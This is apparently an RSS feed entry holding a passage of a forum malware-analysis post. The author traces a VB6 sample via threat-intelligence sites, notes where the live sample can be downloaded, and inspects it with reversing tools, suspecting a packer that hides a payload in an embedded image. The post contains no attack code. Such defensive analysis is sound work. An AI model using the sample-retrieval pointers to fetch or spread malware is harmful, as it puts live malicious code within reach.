<p><a href="https://urlhaus.abuse.ch/url/292461/" rel="noopener nofollow ugc">urlhaus</a> leads to <a href="https://www.virustotal.com/gui/file/e6ffb945247085ceb6b2478c643dc337a35d5c0c17d2e4709c3a5842c9bcb3e3/detection" rel="noopener nofollow ugc">Virus total</a> which gives us the SHA256 hash of this file(which only 13 AV engines detected as of this date!) and a google search of that leads to <a href="https://hybrid-analysis.com/sample/e6ffb945247085ceb6b2478c643dc337a35d5c0c17d2e4709c3a5842c9bcb3e3?environmentId=120" rel="noopener nofollow ugc">hybrid-analysis</a>, and from there we can get the raw sample(or 0x00sec users can just use getsample in the discord malware channel).</p>
<p>I downloaded the sample and ran it in PEID:</p>
<p><img src="/uploads/default/original/2X/7/79c0d7a87c3568c2def82f2d1b385bb4de9fc9fc.png" alt="" data-base62-sha1="hn4W5pDQ0Jieb5sU1SfjBjn2rjS" width="536" height="306"></p>
<p>Alright, Vb6? Lets see how it looks in IDA:</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/1/161c8704218a055d482375a900daeba0d25ef33e.png" data-download-href="/uploads/short-url/39BCGNuSIilZa9q6yNOMBFa9FxA.png?dl=1" title=""><img src="/uploads/default/original/2X/1/161c8704218a055d482375a900daeba0d25ef33e.png" alt="" data-base62-sha1="39BCGNuSIilZa9q6yNOMBFa9FxA" width="602" height="351" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/1/161c8704218a055d482375a900daeba0d25ef33e_2_10x10.png"></a></div><p></p>
<p>So as soon as I got released from the hospital from the seizure I got from looking at the disassembly I decided to start digging further.</p>
<p>as the following <a href="https://www.virusbulletin.com/virusbulletin/2014/07/not-old-enough-be-forgotten-new-chic-visual-basic-6" rel="noopener nofollow ugc">virus bullet-in</a> paper states:</p>
<blockquote>
<p>"…The laughing vs. crying aspect of VB6 is primarily related to the fact that VB6 internals lack any sort of official documentation. The inner workings of the VB6 virtual machine and the functionality of its exported functions are literally a mystery to anyone who has not taken an in-depth look at msvbvm60.dll.</p>
<p>For native code reversing, it is crucial to understand the challenges of event-driven binaries. Also, the reverser must interpret the functionality of the VB6 APIs called from the binary. But, given that malware executes pretty linearly by nature, and the VB6 APIs are mostly assigned understandable names, native code reversing is just another colourful facet of x86 binaries…”</p>
</blockquote>
<p>I knew I was in for a treat :).</p>
<p>Digging further I found the following <a href="https://r0r5ch4ch.blogspot.com/2019/12/3-levels-of-unpacking-for-newbies-part.html" rel="noopener nofollow ugc">article</a> which introduced me to this <a href="https://www.hex-rays.com/products/ida/support/freefiles/vb.idc" rel="noopener nofollow ugc">IDC Ida script</a> which did make things a bit more readable in IDA view. These articles also mention this tool called <a href="https://www.vb-decompiler.org/" rel="noopener nofollow ugc">VB Decompiler </a>which I decided to use, or at least try and get some results and it worked!</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/6/614427004a52e69a5545929f992811d8cdde0bac.png" data-download-href="/uploads/short-url/dSsktVuJWDAyYr7KSibcScheByY.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/6/614427004a52e69a5545929f992811d8cdde0bac_2_602x347.png" alt="" data-base62-sha1="dSsktVuJWDAyYr7KSibcScheByY" width="602" height="347" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/6/614427004a52e69a5545929f992811d8cdde0bac_2_602x347.png, https://0x00sec.s3.amazonaws.com/optimized/2X/6/614427004a52e69a5545929f992811d8cdde0bac_2_903x520.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/6/614427004a52e69a5545929f992811d8cdde0bac_2_1204x694.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/6/614427004a52e69a5545929f992811d8cdde0bac_2_10x10.png"></a></div><br>
In addition to this finding, I launched the binary in the resource hacker tool and found a suspicious image inside:<p></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/9/999684a95393c2d8a4ed5abea24dd0cf29f4b657.png" data-download-href="/uploads/short-url/lUHxhhpzpPhNVlZFwSBwULrOK1x.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/9/999684a95393c2d8a4ed5abea24dd0cf29f4b657_2_602x263.png" alt="" data-base62-sha1="lUHxhhpzpPhNVlZFwSBwULrOK1x" width="602" height="263" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/9/999684a95393c2d8a4ed5abea24dd0cf29f4b657_2_602x263.png, https://0x00sec.s3.amazonaws.com/optimized/2X/9/999684a95393c2d8a4ed5abea24dd0cf29f4b657_2_903x394.png 1.5x, /uploads/default/original/2X/9/999684a95393c2d8a4ed5abea24dd0cf29f4b657.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/9/999684a95393c2d8a4ed5abea24dd0cf29f4b657_2_10x10.png"></a></div><p></p>
<p>This leads me to believe that this might be a VB6 packer and it uses this image to unpack another executable.</p>
<p><strong>Conclusion:</strong></p>
<p>In this part of the article we demonstrated how might a malware analyst approach analyzing a maldoc, we learned that again - goal setting and understanding the bigger picture can save time in the process of malware analysis.</p>
<p>As this finding led me to a completely new binary I would like to dedicate the next part of this series to analyzing this malware but I would be doing so in a different post. Till next time <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> (probably this weekend)</p>
<p>Sources used:</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/c/5/c52bf94a22b1fa1fc26a92b73dc1d020a1293019.png" class="site-icon" width="16" height="16">
      <a href="https://www.virusbulletin.com/virusbulletin/2014/07/not-old-enough-be-forgotten-new-chic-visual-basic-6" target="_blank" rel="noopener nofollow ugc">virusbulletin.com</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://www.virusbulletin.com/virusbulletin/2014/07/not-old-enough-be-forgotten-new-chic-visual-basic-6" target="_blank" rel="noopener nofollow ugc">Virus Bulletin :: Not old enough to be forgotten: the new chic of Visual Basic 6</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://r0r5ch4ch.blogspot.com/favicon.ico" class="site-icon" width="32" height="32">
      <a href="https://r0r5ch4ch.blogspot.com/2019/12/3-levels-of-unpacking-for-newbies-part.html" target="_blank" rel="noopener nofollow ugc">r0r5ch4ch.blogspot.com</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/362;"><img src="/uploads/default/original/2X/2/24a4a7dabe98c715a506f56834db04583be4b3ee.png" class="thumbnail" width="690" height="362" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/2/24a4a7dabe98c715a506f56834db04583be4b3ee_2_10x10.png"></div>

<h3><a href="https://r0r5ch4ch.blogspot.com/2019/12/3-levels-of-unpacking-for-newbies-part.html" target="_blank" rel="noopener nofollow ugc">3 Levels of Unpacking For Newbies. Part #2: Stubbornly Unpack VB6 RunPE</a></h3>

<p>This is the second part of the 3 parts series attempt to teach beginners the fundamental concepts and basic techniques for unpacking. Since ...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://www.vb-decompiler.org/image/icons/favicon.svg" class="site-icon" width="120" height="120">
      <a href="https://www.vb-decompiler.org/" target="_blank" rel="noopener nofollow ugc">vb-decompiler.org</a>
  </header>
  <article class="onebox-body">
    <img src="" class="thumbnail" width="" height="">

<h3><a href="https://www.vb-decompiler.org/" target="_blank" rel="noopener nofollow ugc">VB Decompiler - Main - Native Code and P-Code decompiler for Visual Basic...</a></h3>



  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="/uploads/default/original/2X/3/338e7063f406dc7362e9683d79c3e318e141f146.png" class="site-icon" width="32" height="32">
      <a href="https://www.avira.com/en/blog/new-malware-in-old-excel-skins" target="_blank" rel="noopener nofollow ugc" title="03:24PM - 18 April 2019">Avira Blog – 18 Apr 19</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/345;"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1329e2416120a2f773224f710ae448b868092405_2_690x345.jpeg" class="thumbnail" width="690" height="345" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1329e2416120a2f773224f710ae448b868092405_2_690x345.jpeg, https://0x00sec.s3.amazonaws.com/optimized/2X/1/1329e2416120a2f773224f710ae448b868092405_2_1035x517.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/1/1329e2416120a2f773224f710ae448b868092405_2_1380x690.jpeg 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/1/1329e2416120a2f773224f710ae448b868092405_2_10x10.png"></div>

<h3><a href="https://www.avira.com/en/blog/new-malware-in-old-excel-skins" target="_blank" rel="noopener nofollow ugc">New malware in old Excel skins | Avira Blog</a></h3>

<p>Why worry about making a new malware trick when you can tweak an old Excel spreadsheet to do the job for you? Hackers are now doing just that: They are using new techniques to leverage their attacks based on a feature over 25 years old called Excel...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<br>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="/uploads/default/original/2X/1/10940f0c43715df64508f6d5f5897896d390a9e4.png" class="site-icon" width="500" height="500" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/1/10940f0c43715df64508f6d5f5897896d390a9e4_2_10x10.png">
      <a href="https://cofense.com/rtf-malware-delivery/" target="_blank" rel="noopener nofollow ugc" title="11:02AM - 09 December 2015">Cofense – 9 Dec 15</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/476;"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/9/907324c40680fc3e72dc33bcea95ca68d6c8d1c2_2_690x476.png" class="thumbnail" width="690" height="476" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/9/907324c40680fc3e72dc33bcea95ca68d6c8d1c2_2_690x476.png, /uploads/default/original/2X/9/907324c40680fc3e72dc33bcea95ca68d6c8d1c2.png 1.5x, /uploads/default/original/2X/9/907324c40680fc3e72dc33bcea95ca68d6c8d1c2.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/9/907324c40680fc3e72dc33bcea95ca68d6c8d1c2_2_10x10.png"></div>

<h3><a href="https://cofense.com/rtf-malware-delivery/" target="_blank" rel="noopener nofollow ugc">Using RTF Files as a Delivery Vector for Malware - Cofense</a></h3>

<p>During malware analysis we often see attackers using features in creative ways to deliver and obfuscate malware. We’ve recently seen an increase with samples leveraging RTF temp files&nbsp;as a delivery method to encapsulate and drop malware. The...</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

          <p><a href="https://0x00sec.org/t/analyzing-modern-malware-techniques-part-2/18765/1">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/analyzing-modern-malware-techniques-part-2/18765/1</link>
        <pubDate>Thu, 23 Jan 2020 20:49:56 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-18765-1</guid>
        <source url="https://0x00sec.org/t/analyzing-modern-malware-techniques-part-2/18765.rss">Analyzing Modern Malware Techniques - Part 2</source>
      </item>
  </channel>
</rss>
